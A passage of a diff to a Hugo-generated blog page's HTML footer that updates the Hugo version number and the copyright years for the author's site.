                 Please enable JavaScript to view the comments powered by <a href="https://valine.js.org/">Valine</a>.
             </noscript></div></article></div>
         </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.89.2">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreffer" title="DoIt 0.2.10"><i class="far fa-edit fa-fw"></i> DoIt</a>
-                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/liuliuliuzy" target="_blank" rel="noopener noreferrer">zyleo</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line">由 <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.93.1">Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/HEIGE-PCloud/DoIt" target="_blank" rel="noopener noreffer" title="DoIt 0.2.10"><i class="far fa-edit fa-fw"></i> DoIt</a>
+                </div><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2020 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="https://github.com/liuliuliuzy" target="_blank" rel="noopener noreferrer">zyleo</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div></footer></div>
 
     <div id="fixed-buttons"><a href="#back-to-top" id="back-to-top-button" class="fixed-button" title="回到顶部">
